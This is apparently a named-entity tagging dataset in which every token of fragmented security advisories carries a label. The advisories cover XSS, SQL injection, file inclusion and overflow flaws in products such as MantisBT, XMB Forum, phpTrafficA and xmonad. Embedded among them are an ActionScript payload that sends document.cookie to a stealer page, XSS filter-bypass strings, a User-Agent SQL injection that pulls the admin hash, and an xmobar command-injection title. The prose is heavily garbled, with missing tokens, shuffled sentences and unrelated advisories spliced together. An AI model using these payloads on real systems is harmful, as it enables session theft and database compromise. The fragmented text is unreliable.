The O
management O
interface O
in O
ZyNOS SN
3.62 SV
( O
WK.6 SV
) O
on O
the O
Zyxel SN
Zywall SN
2 SV
device O
allows O
remote O
authenticated O
administrators O
to O
cause O
a O
denial O
of O
service O
( O
infinite O
reboot O
loop O
) O
via O
invalid O
configuration O
data O
. O

Vendor O
Status O
: O

Perform O
administration O
using O
SSH O
. O

Workaround O
: O
Change O
administration O
password O
and O
default O
IP O
address O
. O

Details O
: O
Embedded O
device O
management O
interface O
does O
not O
validate O
the O
origin O
of O
an O
HTTP O
request O
. O

As O
the O
management O
interface O
is O
most O
usually O
located O
at O
the O
default O
IP O
address O
and O
might O
even O
have O
default O
password O
in O
place O
, O
performing O
an O
successful O
attack O
is O
not O
far O
fetched O
. O

See O
provided O
proof-of-concept O
code O
for O
more O
information O
. O

All O
rights O
reserved O
. O

After O
receiving O
invalid O
configuration O
, O
the O
device O
will O
reboot O
and O
enter O
an O
infinite O
reboot O
loop O
. O

Successful O
attack O
requires O
that O
the O
attacker O
knows O
the O
management O
interface O
address O
for O
the O
target O
device O
. O

- O
Notice O
that O
you O
ystem O
name O
variable O
is O
limited O
in O
length O
, O
so O
you O
ll O
need O
a O
relatively O
short O
URL O
. O

From O
an O
ordinary O
consumer O
point-of-view O
, O
the O
device O
is O
compeletely O
useless O
. O

Vendor O
responded O
by O
email O
June O
7 O
2007 O
- O

changing O
dns O
server O
address O
or O
other O
security O

Problem O
Description O

within O

the O

given O

on O

page O
. O

A O

More O

and O

see O
This O
attack O
has O
a O
vast O
impact O
on O

of O

multiple O

parameter O
to O
bug_actiongroup_ext_page.php O
& O

not O
properly O
verified O
before O
being O
used O
to O
include O
files O
. O

This O
can O
be O
exploited O
to O
include O

from O

resources O
via O
directory O
traversal O
sequences O

bytes O
. O

Tested O
Version O
: O
1.2.7 SV

Multiple O
vulnerabilities O
in O
MantisBT O

Major O
Linux O
distributions O
shipping O
mantisbt-1.2.x O
will O
also O
be O
informed O
. O

MantisBT O
bug O
reports O
with O
full O
details O
( O
including O
patches O
) O
are O
available O
at O
and O
. O

Web O
server O
and/or O
PHP O
and/or O
operating O
system O
configuration O
will O
dictate O
whether O
this O
vulnerability O
can O
be O
exploited O
. O

Paul O
Richards O
( O
MantisBT O
developer O
) O
also O
discovered O
this O
issue O
during O
a O
routine O
audit O
. O

The O
error O
message O
from O
the O
require_once O
( O
) O
call O
is O
not O
sanitised O
by O
PHP O
prior O
to O
displaying O
it O
to O
the O
user O
. O

In O
default O
and O
typical O
MantisBT O
installations O
, O
this O
is O
limited O
to O
users O
that O
are O
currently O
logged O
in O
. O

Projax O
does O
not O
escape O
value O
attributes O
when O
printing O
input O
form O
elements O
. O

Announcements O
will O
be O
made O
to O
mantisbt-announce O
@ O
... O
ts.sourceforge.net O
, O
mantisbt.org/blog O
, O
mantishelp O
on O
irc.freenode.net O
and O
other O
usual O
channels O
. O

Best O
( O
and O
therefore O
common O
) O
practice O
is O
to O
not O
display O
PHP O
error O
messages O
to O
the O
end O
user O
, O
severely O
limiting O
the O
applicability O
of O
this O
attack O
. O

Users O
running O
MantisBT O
on O
a O
vanilla O
nginx O
installation O
are O
unaffected O
because O
nginx O
will O
check O
to O
see O
whether O
the O
full O
URL O
path O
exists O
and O
is O
valid O
( O
with O
an O
XSS O
injection O
string O
, O
it O
won O
t O
be O
) O
. O

A O
suffix O
is O
appended O
, O
but O
can O
be O
stripped O
off O
using O
a O
null O
character O
( O
% O
00 O
) O
. O

Other O
web O
servers O
such O
as O
Apache O
won O
t O
perform O
these O
stringent O
checks O
and O
are O
therefore O
MantisBT O
is O
vulnerable O
to O
this O
attack O
when O
running O
on O
an O
Apache O
server O
. O

This O
attack O
does O
not O
require O
users O
to O
be O
authenticated O
or O
logged O
into O
a O
MantisBT O
installation O
to O
be O
impacted O
by O
this O
vulnerability O
. O

Subject O
: O
CVE O
requests O
: O
< O
mantisbt-1.2.8 O
multiple O
vulnerabilities O
( O
1xLFI+XSS O
, O
2xXSS O
) O
Request O
1 O
: O
XSS O
injection O
via O
PHP_SELF O
Paulino O
Calderon O
from O
Websec O
reported O
an O
issue O
against O
MantisBT O
1.2.6 O
whereby O
an O
attacker O
could O
craft O
URLs O
such O
that O
arbitrary O
HTML O
could O
be O
inserted O
into O
page O
output O
. O

Additional O
information O
: O
A O
new O
release O
( O
mantisbt-1.2.8 O
) O
is O
being O
put O
together O
and O
will O
be O
available O
shortly O
to O
download O
from O
mantisbt.org O
to O
resolve O
these O
3 O
vulnerabilities O
. O

In O
some O
respects O
, O
this O
issue O
is O
also O
a O
bug O
with O
Projax O
however O
it O
may O
be O
a O
case O
that O
users O
of O
this O
library O
are O
expected O
to O
provide O
values O
that O
are O
already O
sanitised O
. O

This O
vulnerability O
can O
also O
allow O
an O
attacker O
to O
perform O
an O
XSS O
attack O
( O
no O
login/session O
required O
with O
the O
MantisBT O
attacker O
) O
if O
PHP O
is O
configured O
to O
display O
error O
messages O
. O

The O
cause O
of O
this O
problem O
is O
with O
the O
use O
of O
the O
ancient O
Projax O
library O
( O
available O
at O
) O
in O
the O
1.2.x SV
branch O
of O
MantisBT SN
. O

MantisBT O
will O
prepend O
bug_actiongroup_ O
prior O
to O
the O
attacker-supplied O
path O
. O

MantisBT O
1 O
. O
3.x SV
( O
master O
branch O
) O
uses O
jQuery O
instead O
of O
Projax O
and O
is O
therefore O
not O
impacted O
by O
this O
vulnerability O
. O

Some O
environments O
( O
at O
least O
nginx O
and O
php-fpm O
5.3 O
) O
do O
not O
allow O
directory O
traversal O
from O
a O
file O
or O
invalid O
path/file O
. O

Other O
environments O
do O
allow O
directory O
traversal O
from O
file O
names O
( O
even O
invalid O
ones O
) O
, O
for O
instance O
: O
bug_actiongroup_page.php/../private_file O
or O
bug_actiongroup_/../private_file O
. O

Full O
details O
and O
patches O
are O
available O
at O
. O

Vendor O
description O
: O
I-Load O
is O
an O
ASP.NET O
component O
explicitly O
created O
to O
manage O
image O
uploading O
within O
ASP.NET O
applications O
. O

Unlike O

, O

uses O
a O

interface O
which O
allows O
the O
uploading O
, O

, O

and O
rotating O
of O
photos O
. O

Arbitrary O
File O
Upload O

is O
potentially O
possible O
to O
upload O
an O
arbitrary O
file O
using O
the O
I-Load O
Webcontrol O
with O
a O
user-defined O
file O
extension O
. O

( O
XSS O
) O
vulnerabilities O
in O

( O

) O
before SV

allow O
remote O

users O
to O

arbitrary O

or O

) O

scripting O
( O
XSS O
) O
vulnerabilities O
in O
the O
web O
interface O
in O
Aruba SN
Mobility SN
Controller SN
2.4.8.x-FIPS SV
, O

, O

authentication O

by O

to O
this O

. O

to O

. O

TITLE O
: O
Mobility O
Controller O
Web O
UI O
Cross O
Site O
Scripting O
Vulnerabilities O
SUMMARY O
Cross-site O
scripting O
vulnerabilities O
were O
discovered O
during O
standard O
bug O
reporting O
procedures O
in O
the O
Aruba O
Mobility O
Controller O
. O

Providing O
malformed O
input O
to O
the O
web O
UI O
may O
result O
in O
the O
presentation O
of O
that O
input O
to O
the O
user O
. O

A O
vulnerability O
in O
the O
TACACS O
authentication O
component O
may O
allow O
unauthorized O
web O
UI/ssh/telnet O
access O
to O
the O
Aruba O
Mobility O
Controller O
. O

This O
advisory O
may O
be O

freely O

TITLE O
: O
Mobility O
Controller O
TACACS O
User O
Authentication O
Vulnerability O
SUMMARY O
A O
user O
authentication O
vulnerability O
was O
discovered O
during O
standard O
bug O
reporting O
procedures O
in O
the O
Aruba O
Mobility O
Controller O
. O

By O
default O
, O
user O
accounts O
and O
passwords O
are O
kept O
in O
a O
local O
database O
which O
is O
not O
vulnerable O
to O
this O
issue O
. O

EXPLOITATION O
AND O
PUBLIC O
ANNOUNCEMENTS O
This O
vulnerability O
will O
be O
announced O
at O
Aruba O
W.S.I.R.T O
. O

AFFECTED O
ArubaOS SN
VERSIONS O
~ O
2.5.5.x SV
, O
2.5.6.x SV
, O
2.4.8.x-FIPS SV
, O
3.1.1.x SV
, O
3.1.1.x-FIPS SV
, O
3.2.0.x SV
, O
3.3.1.x SV
DETAILS O
Aruba O
Mobility O
Controllers O
may O
present O
a O
web-based O
management O
and O
captive O
portal O
interface O
. O

- O
- O
Do O
not O
expose O
the O
Mobility O
Controller O
administrative O
interface O
to O
untrusted O
networks O
such O
as O
the O
Internet O
. O

concerned O
about O
this O
problem O
are O
encouraged O
to O
check O
the O
above O
URL O
for O
any O
updates O
. O

Should O
there O
be O
a O
significant O
change O
in O
the O
facts O
, O

may O
update O
this O
advisory O
. O

: O

Cross-site O
scripting O
( O
XSS O
) O
vulnerability O
in O
XMB SN
Forum SN
1.9.5 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
web O
script O
or O
HTML O
by O
uploading O
a O
Flash O
( O
.SWF O
) O
video O
that O
contains O
a O
getURL O
function O
call O
, O
which O
causes O
the O
video O
to O
be O
rendered O
without O
disabling O
ActionScript O
. O

r0xes O
[ O
dot O
] O
ratm O
[ O
at O
] O
gmail O
[ O
dot O
] O
com O

comments O
, O
questions O
, O
flames O
, O
etc O
. O

The O
way O
we O
execute O
our O
code O
is O
by O
making O
a O
flash O
movie O
containing O
the O
Actionscript O
code O
: O
getURL O
( O
javascript O
: O
document.location= O
tealer.php O
cookie= O
+document.cookie O
; O
) O
; O
An O
example O
video O
+ O
.fla O
script O
can O
be O
downloaded O
at O
my O
site O
: O
XMB O
has O
been O
notified O
, O
expect O
this O
to O
be O
fixed O
in O
a O
few O
days O
. O

Normally O
, O
you O
could O
set O
an O
option O
on O
the O
< O
object O
tag O
to O
say O
that O
ActionScript O
can O
not O
run O
, O
but O
in O
this O
case O
we O
don O
t O
. O

XMB SN
Forum SN
1.9.5 SV
( O
I O
have O
not O
tested O
this O
on O
earlier O
versions O
) O
allows O
users O
to O
embed O
flash O
( O
.swf O
) O
videos O
in O
their O
posts O
. O

XMB SN
Forum SN
1.9.5 SV
-Final O
XSS O

Multiple O
cross-site O
scripting O
( O
XSS O
) O
vulnerabilities O
in O
PHPWebGallery SN
1.4.1 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
web O
script O
or O
HTML O
via O
the O
( O
1 O
) O
cat O
, O
( O
2 O
) O
num O
, O
and O
( O
3 O
) O
search O
parameters O
to O
( O
a O
) O
category.php O
, O
and O
the O
( O
4 O
) O
slideshow O
, O
( O
5 O
) O
show_metadata O
, O
and O
( O
6 O
) O
start O
parameters O
to O
( O
b O
) O
picture.php O
, O
a O
different O
vulnerability O
than O
CVE-2006-1674 O
. O

Vendor O
: O
Software O
: O
PHPWebGallery O
Version O
: O
1.4.1 SV
category.php O
and O
picture.php O
scripts O
are O
vulnerable O
to O
XSS O
attacks O
. O

: O
ilable O

: O

PHPWebGallery O
Multiple O
Cross O
Site O
Scripting O
Vulnerabilities O

Cross-site O
scripting O
( O
XSS O
) O
vulnerability O
in O
resultat.asp O
in O
SoftMaker O
Shop O
allows O
remote O
attackers O
to O
inject O
arbitrary O
web O
script O
or O
HTML O
via O
a O
strSok O
parameter O
containing O
a O
javascript O
: O
URI O
in O
an O
IMG O
SRC O
attribute O
. O

Some O
fields O
have O
been O
filtered O
in O
a O
basic O
form O
, O
so O
that O
simple O
scripting O
like O
< O
script O
> O
alert O
( O
XSS O
) O
< O
/script O
> O
is O
not O
possible O
. O

PoC O
: O
IMG+SRC O
% O
3Djavascript O
% O
3Aalert O
% O
28 O
% O
26quot O
% O
3BXSS O
% O
26quot O
% O
3B O
% O
29 O
% O
3E O
& O
valg=varer O

However O
, O
since O
the O
filtering O
is O
not O
based O
on O
white O
listing O
you O
can O
conduct O
successful O
XSS O
attacks O
with O
code O
like O
< O
IMG O
SRC=javascript O
: O
alert O
( O
String.fromCharCode O
( O
88,83,83 O
) O
) O
> O
. O

Vendors O
site O
: O
Please O
credit O
to O
: O
Preben O
Nyl O
xc3 O
xb8kken O

Inputs O
in O
the O
SoftMaker O
Shop O
is O
not O
properly O
sanitized O
, O
and O
XSS O
is O
possible O
in O
a O
lot O
of O
the O
systems O
input O
fields O
and O
url O
parameters O
. O

SoftMaker O
Shop O
is O
vulnerable O
to O
XSS O

pmwiki.php O
in O
PmWiki SN
2.1 SV
beta SV
20 SV
, O
with O
register_globals O
enabled O
, O
allows O
remote O
attackers O
to O
bypass O
protection O
mechanisms O
that O
deregister O
global O
variables O
by O
setting O
both O
a O
GPC O
variable O
and O
a O
GLOBALS O
[ O
] O
variable O
with O
the O
same O
name O
, O
which O
causes O
PmWiki O
to O
unset O
the O
GLOBALS O
[ O
] O
variable O
but O
not O
the O
GPC O
variable O
, O
which O
creates O
resultant O
vulnerabilities O
such O
as O
remote O
file O
inclusion O
and O
cross-site O
scripting O
( O
XSS O
) O
. O

MediaWiki SN
before SV
1.5.4 SV
uses O
a O
hard-coded O
internal O
placeholder O
string O
, O
which O
allows O
remote O
attackers O
to O
bypass O
protection O
against O
cross-site O
scripting O
( O
XSS O
) O
attacks O
and O
execute O
Javascript O
using O
inline O
style O
attributes O
, O
which O
are O
processed O
by O
Internet O
Explorer O
. O

scripting O
( O
XSS O
) O
vulnerability O
in O

in O
PHP SN
JackKnife SN
2.21 SV
and SV
earlier SV

remote O
attackers O
to O

or O
HTML O
via O

values O
in O
the O

parameter O
. O

: O

provenance O
of O
this O
issue O
is O
unknown O
; O
the O
details O
were O
obtained O
solely O
from O
third O
party O
sources O
and O
independently O
verified O
using O
source O
code O

. O

in O
the O

function O

of O

. O

Proof O
of O
Concept O
: O

Source O
: O
have O

It O
is O

to O
reproduce O
with O

enabled O
for O

( O

, O

specific O

. O

guilty O
driver O

( O

bugcheck O

and O
saved O
in O

in O

and SV

of O

with O
prepared O
statements O
. O

- O

in O
one O
query O
. O

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
Product O
: O
phpTrafficA O
Product O
page O
: O

Description O
: O
An O
SQL O
injection O
exists O
in O
Php/Functions/log_function.php O
, O
line O
933 O
: O
$ O
sql3 O
= O
INSERT O
INTO O
` O
$ O
{ O
table O
} O
_host` O
SET O
date= O
$ O
date O
, O
host O
hostname O
page= O
$ O
page O
, O
ref= O
$ O
cleanref O
, O
agent= O
$ O
agent O
, O
longIP= O
$ O
iplong O
; O
The O
$ O
agent O
variable O
comes O
directly O
from O
$ O
_SERVER O
[ O
HTTP_USER_AGENT O
] O
, O
without O
any O
escaping O
. O

For O
example O
, O
the O
following O
spoofed O
user O
agent O
will O
store O
the O
ASCII-value O
of O
the O
second O
character O
of O
the O
admin O
hash O
as O
its O
IP O
: O
Firefox O
, O
longIP= O
( O
SELECT O
ASCII O
( O
SUBSTRING O
( O
value,2,1 O
) O
) O
FROM O
phpTrafficA_conf O
WHERE O
variable= O
adminpassword O
) O
This O
will O
be O
displayed O
in O
the O
Latest O
visitors O
Details O
section O
, O
and O
by O
repeating O
this O
procedure O
multiple O
times O
, O
the O
entire O
admin O
hash O
( O
or O
any O
other O
database O
content O
) O
can O
be O
retrieved O
. O

regards O
, O
Daniel O
Geerts O

Affected O
versions O
: O
Up SV
to SV
and SV
including SV
2.3 SV
( O
latest O
as O
of O
writing O
) O
. O

This O
makes O
SQL O
injection O
possible O
. O

This O
prevents O
the O
attacker O
from O
obtaining O
the O
output O
of O
the O
manipulated O
query O
. O

Even O
if O
multiple O
statements O
in O
one O
query O
has O
been O
turned O
off O
, O
the O
contents O
of O
the O
database O
can O
still O
be O
read O
by O
manipulating O
the O
last O
parameter O
of O
the O
query O
( O
the O
IPv4-address O
stored O
as O
an O
integer O
) O
. O

- O
- O
Apply O
this O
quick O
fix O
to O
line O
933 O
: O
$ O
sql3 O
= O
INSERT O
INTO O
` O
$ O
{ O
table O
} O
_host` O
SET O
date= O
$ O
date O
, O
host O
hostname O
page= O
$ O
page O
, O
ref= O
$ O
cleanref O
, O
agent= O
.mysql_real_escape_string O
( O
$ O
agent O
) O
. O

, O
longIP= O
$ O
iplong O
; O
The O
code-fix O
does O
not O
resolve O
the O
SQL O
injection O
for O
all O
server O
configurations O
, O
but O
should O
be O
sufficient O
for O
most O
. O

via O
unknown O
vectors O
. O

The O
XMonad.Hooks.DynamicLog O
in O
xmonad-contrib SN
before SV
0.11.2 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
commands O
via O
a O
web O
page O
title O
, O
which O
activates O
the O
commands O
when O
the O
user O
clicks O
on O
the O
xmobar O
window O
title O
, O
as O
demonstrated O
using O
an O
action O
tag O
. O

Background O
DynamicLog O
module O
feeds O
information O
to O
others O
programs O
about O
what O
happening O
on O
xmonad O
window O
manager O
. O

In O
dzen2 O
this O
is O
also O
possible O
, O
although O
I O
haven O
t O
tried O
to O
execute O
code O
. O

A O
( O
harmless O
) O
proof O
of O
concept O
is O
attached O
for O
both O
bars O
. O

Subject O
: O
CVE-2013-1436 O
: O
xmonad-contrib O
remote O
command O
injection O
Hello O
, O
I O
ve O
discovered O
a O
remote O
command O
injection O
vulnerability O
in O
xmonad-contrib O
. O

A O
patch O
written O
by O
Adam O
Vogt O
can O
be O
retrieved O
from O
the O
commit O
in O
the O
darcs O
repo O
. O

I O
would O
like O
to O
thank O
Joachim O
Breitner O
and O
the O
Debian O
Security O
Team O
for O
their O
help O
in O
disclosing O
this O
issue O
. O

For O
example O
, O
xmobar O
will O
make O
the O
following O
text O
clickable O
. O

In O
xmobar O
this O
will O
be O
something O
like O
this O
: O
< O
html O
< O
head O
< O
title O
> O
& O
lt O
; O
action=xclock O
& O
gt O
; O
An O
innocent O
title O
& O
lt O
; O
/action O
& O
gt O
; O
< O
/title O
< O
/head O
< O
body O
< O
h1 O
> O
Good O
bye O
, O
cruel O
world O
< O
/h1 O
< O
/body O
< O
/html O
So O
, O
if O
the O
user O
accidentally O
( O
or O
incidentally O
) O
clicks O
on O
the O
xmobar O
window O
title O
, O
the O
command O
will O
be O
executed O
. O

Such O
programs O
generally O
are O
status O
bars O
as O
xmobar O
or O
dzen2 O
. O

Both O
bars O
uses O
some O
meta-language O
to O
format O
their O
input O
. O

It O
has O
been O
assigned O
the O
name O
CVE-2013-1436 O
. O

< O
action=xclock O
> O
Click O
to O
clock O
< O
/action O
Vulnerability O
& O
exploit O
As O
we O
know O
, O
web O
browsers O
usually O
set O
the O
window O
title O
to O
the O
current O
tab O
. O

A O
malicious O
user O
, O
then O
, O
can O
craft O
a O
special O
title O
in O
order O
to O
inject O
commands O
in O
the O
current O
bar O
. O

These O
programs O
features O
the O
ability O
of O
receiving O
formatted O
input O
from O
stdin O
, O
and O
that O
the O
way O
used O
by O
xmonad O
to O
communicate O
information O
such O
as O
workspace O
status O
, O
current O
layout O
and O
window O
title O
. O

Fix O
A O
fix O
for O
this O
issue O
is O
already O
available O
in O
xmonad O
webpage O
. O

So O
far O
, O
so O
good O
. O

The O
proof O
for O
dzen2 O
just O
changes O
the O
background O
color O
of O
the O
bar O
. O

: O
Fri O
, O
26 O
Jul O
2013 O
11:16:37 O
-0300 O

you O

module O
, O

Engine O
( O

ZDI-11-048 O
: O
IBM O
Lotus O
Domino O
iCalendar O
Meeting O
Request O
Parsing O
Remote O
Code O
Execution O
Vulnerability O
February O
7 O
, O
2011 O
- O
This O
vulnerability O
is O
being O
disclosed O
publicly O
without O
a O
patch O
in O
accordance O
with O
the O
ZDI O
180 O
day O
deadline O
. O

For O
further O
product O
information O
on O
the O
TippingPoint O
IPS O
, O
visit O
: O
Vulnerability O
Details O
: O
This O
vulnerability O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
on O
systems O
with O
vulnerable O
installations O
of O
IBM O
Lotus O
Domino O
. O

By O
providing O
enough O
data O
this O
buffer O
can O
overflow O
leading O
to O
arbitrary O
code O
execution O
under O
the O
context O
of O
the O
SYSTEM O
user O
. O

Instead O
, O
upon O
notifying O
the O
affected O
product O
vendor O
, O
TippingPoint O
provides O
its O
customers O
with O
zero O
day O
protection O
through O
its O
intrusion O
prevention O
technology O
. O

Our O
vulnerability O
disclosure O
policy O
is O
available O
online O
at O
: O
Follow O
the O
ZDI O
on O
Twitter O
: O

The O
process O
copies O
the O
contents O
of O
the O
name O
parameter O
within O
the O
Content-Type O
header O
into O
a O
fixed O
size O
stack O
buffer O
. O

The O
specific O
flaw O
exists O
within O
the O
nrouter.exe O
service O
while O
processing O
a O
malformed O
calendar O
meeting O
request O
. O

Furthermore O
, O
with O
the O
altruistic O
aim O
of O
helping O
to O
secure O
a O
broader O
user O
base O
, O
TippingPoint O
provides O
this O
vulnerability O
information O
confidentially O
to O
security O
vendors O
( O
including O
competitors O
) O
who O
have O
a O
vulnerability O
protection O
or O
mitigation O
product O
. O

Authentication O
is O
not O
required O
to O
exploit O
this O
vulnerability O
. O

Affected O
Products O
: O
IBM O
Lotus O
Domino O
TippingPoint O
( O
TM O
) O
IPS O
Customer O
Protection O
: O
TippingPoint O
IPS O
customers O
have O
been O
protected O
against O
this O
vulnerability O
by O
Digital O
Vaccine O
protection O
filter O
ID O
6320 O
. O

: O

Lotus O

The O
GLX O
extension O
in O
X.Org SN
xserver SN
1.7.7 SV
allows O
remote O
authenticated O
users O
to O
cause O
a O
denial O
of O
service O
( O
server O
crash O
) O
and O
possibly O
execute O
arbitrary O
code O
via O
( O
1 O
) O
a O
crafted O
request O
that O
triggers O
a O
client O
swap O
in O

; O
or O
( O
2 O
) O
a O
crafted O
length O
or O
( O
3 O
) O

negative O
value O
in O
the O
screen O
field O
in O
a O
request O
to O
glx/glxcmds.c O
. O

Reporter O
is O
me O
@ O
... O
fdog.net O
These O
can O
probably O
allow O
a O
attacker O

to O

( O

Vulnerability O
details O
: O
The O
VLC O
media O
player O
contains O
a O
stack O
overflow O
vulnerability O

( O
rt O
) O

PGP O
Signature O

2008 O
Tobias O

The O
vulnerability O
can O
be O
trivially O
exploited O
by O
a O
( O
remote O
) O
attacker O
to O
execute O
arbitrary O
code O
in O
the O

of O
VLC O
media O
player O
. O

If O
such O

file O
is O
found O
, O
VLC O
loads O
and O
parses O
the O
file O
. O

The O
user O

data O
gets O

in O
the O
stack O
buffers O
psz_end O
and O

without O
any O

checking O
. O

[ O
TKADV2008-011 O
] O

media O
player O
RealText O
Processing O

Overflow O
Vulnerability O

injection O
vulnerability O

allows O

attackers O
to O

arbitrary O

SMB O
in O

service O
in O
Microsoft SN
Windows SN
2000 SV
SP4 SV
, O
XP SV
SP2 SV
and SV
SP3 SV
